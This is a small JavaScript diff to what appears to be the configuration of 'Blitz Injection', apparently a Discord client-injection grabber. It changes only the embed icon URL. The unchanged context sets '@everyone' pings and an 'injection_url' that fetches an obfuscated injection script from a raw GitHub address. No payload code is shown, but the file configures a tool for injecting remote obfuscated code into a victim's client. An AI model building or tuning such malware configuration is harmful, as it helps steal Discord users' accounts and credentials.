@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'Blitz Injection', 
-  embed_icon: 'https://cdn.discordapp.com/avatars/1089057920865550386/311b0a7fd44a057f62ab9eca8bdc74fc.webp?size=4096'.replace(/ /g, '%20'),
+  embed_icon: 'https://cdn.discordapp.com/avatars/1059605654668583003/b7f53e25dde48cac804da9289518c868.png?size=2048'.replace(/ /g, '%20'),
   embed_color: 0000000, 
   injection_url: 'https://raw.githubusercontent.com/zvkro/injection/main/obfuscated-injection.js', 
 
